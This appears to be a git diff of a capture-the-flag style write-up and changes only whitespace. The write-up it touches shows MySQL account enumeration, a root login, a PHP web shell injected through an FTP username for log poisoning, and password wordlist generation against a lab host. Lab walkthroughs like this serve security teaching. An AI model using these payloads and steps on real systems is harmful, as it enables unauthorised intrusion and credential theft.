@@ -57,15 +57,15 @@ Port 3306: mysql --> It is leaking too much information from nmap scan, let's en
 Let's use nmap's script: mysql-enum to get information from mysql.
 
 ```bash
-kali@kali:nmap -p 3306 --script=mysql-enum 10.48.141.232                                                                                                      
+kali@kali:nmap -p 3306 --script=mysql-enum 10.48.141.232
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 12:41 +0545
 Nmap scan report for 10.48.141.232 (10.48.141.232)
 Host is up (0.037s latency).
 
 PORT     STATE SERVICE
 3306/tcp open  mysql
-| mysql-enum: 
-|   Valid usernames: 
+| mysql-enum:
+|   Valid usernames:
 |     admin:<empty> - Valid credentials
 |     test:<empty> - Valid credentials
 |     user:<empty> - Valid credentials
@@ -77,7 +77,6 @@ PORT     STATE SERVICE
 |     administrator:<empty> - Valid credentials
 |     guest:<empty> - Valid credentials
 |_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
-
 Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
 ```
 
@@ -100,8 +99,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-20 12:56:
 We have ourselves a valid credentials for mysql. Let's login.
 
 ```bash
-kali@kali:mysql -u root -h 10.48.141.232 --ssl=0 -p                                                                                                           
-Enter password: 
+kali@kali:mysql -u root -h 10.48.141.232 --ssl=0 -p
+Enter password:
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MySQL connection id is 10680
 Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)
@@ -110,7 +109,7 @@ Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-MySQL [(none)]> 
+MySQL [(none)]>
 ```
 
 We are inside the database. Let's find some user credentials.
@@ -151,15 +150,15 @@ There we see the logs of ftp. Please don't mind the long logs, I was bruteforcin
 Seeing this long list of logs. We can try log poisioning during ftp login.
 
 ```bash
-kali@kali:ftp 10.48.141.232                                                                                                                                
+kali@kali:ftp 10.48.141.232
 Connected to 10.48.141.232.
 220 (vsFTPd 3.0.5)
-Name (10.48.141.232:kali): <?php system($_GET['cmd']); ?>            
+Name (10.48.141.232:kali): <?php system($_GET['cmd']); ?>
 331 Please specify the password.
-Password: 
+Password:
 530 Login incorrect.
 ftp: Login failed
-ftp> 
+ftp>
 ```
 
 Let's check if this was successful.
@@ -194,7 +193,7 @@ et...te
 So, we put 'et...te!' in pass (note: don't forget that exclamation), and generate wordlist with rule: best64.
 
 ```bash
-kali@kali:john -wordlist:pass -rules:best64 -stdout > password                                                                                                
+kali@kali:john -wordlist:pass -rules:best64 -stdout > password
 Using default input encoding: UTF-8
 Press 'q' or Ctrl-C to abort, almost any other key for status
 75p 0:00:00:00 100.00% (2026-02-20 13:42) 1875p/s erute!
